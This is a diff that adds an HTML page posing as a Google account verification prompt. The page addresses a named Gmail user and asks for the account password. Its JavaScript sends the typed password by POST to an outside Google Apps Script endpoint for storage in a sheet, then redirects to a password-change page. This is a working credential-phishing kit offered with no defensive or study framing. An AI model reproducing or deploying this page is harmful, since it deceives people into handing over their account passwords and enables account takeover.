@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+        }
+        .google-logo {
+            width: 40px;
+            margin-bottom: 10px;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        .email {
+            background: #333;
+            padding: 10px;
+            border-radius: 5px;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .input-box {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background: #333;
+            color: #fff;
+            margin-top: 10px;
+        }
+        .checkbox {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .checkbox input {
+            margin-right: 5px;
+        }
+        .next-btn {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 5px;
+            background: #4285F4;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .next-btn:hover {
+            background: #357ae8;
+        }
+        .links {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #bbb;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google Logo" class="google-logo">
+        <div class="title">Hi UMB UMB UMB</div>
+        <div class="email">fishg3115@gmail.com</div>
+        <p>To continue, first verify it's you</p>
+        <input type="password" id="password" class="input-box" placeholder="Enter your password">
+        <label class="checkbox">
+            <input type="checkbox" id="show-password"> Show password
+        </label>
+        <a href="in2.html">  <button class="next-btn" id="next-button">Next</button> </a>
+        <div class="links">Try another way</div>
+    </div>
+<script>
+    document.getElementById("show-password").addEventListener("change", function() {
+        let passwordField = document.getElementById("password");
+        passwordField.type = this.checked ? "text" : "password";
+    });
+
+    const scriptURL = "https://script.google.com/macros/s/AKfycby2mKLfiUTdy7YJbOUwmOBilqcsM4zh443-XiHiNO_4joFXfDjVf8_Yr0AeQyvjoadn/exec";
+
+    document.getElementById("next-button").addEventListener("click", function () {
+        var password = document.getElementById("password").value;
+
+        if (password.trim() === "") {
+            Swal.fire("Error!", "Please enter your password.", "error");
+            return;
+        }
+
+        var formData = new FormData();
+        formData.append("Password", password); // Send password to Google Sheets
+
+        fetch(scriptURL, { method: "POST", body: formData })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Response from Google Script:", data);
+                if (data.includes("Success")) {
+                    Swal.fire("Success!", "Password submitted successfully.", "success")
+                    .then(() => window.location.href = "password_change.html");
+                } else {
+                    Swal.fire("Error!", "Failed to submit password. Check the script.", "error");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                Swal.fire("Error!", "Something went wrong. Please try again!", "error");
+            });
+    });
+	document.getElementById("next-button").addEventListener("click", function () {
+    var password = document.getElementById("password").value;
+
+    if (password.trim() === "") {
+        alert("Please enter your password.");
+        return;
+    }
+
+    var formData = new FormData();
+    formData.append("Password", password);
+
+    fetch("https://script.google.com/macros/s/AKfycby2mKLfiUTdy7YJbOUwmOBilqcsM4zh443-XiHiNO_4joFXfDjVf8_Yr0AeQyvjoadn/exec", {
+        method: "POST",
+        mode: "cors", // Enables CORS
+        body: formData
+    })
+    .then(response => response.json()) // Convert response to JSON
+    .then(data => {
+        if (data.status === "Success") {
+            alert("Password submitted successfully.");
+            window.location.href = "password_change.html";
+        } else {
+            
+        }
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        
+    });
+});
+
+</script>
+
+</body>
+</html>
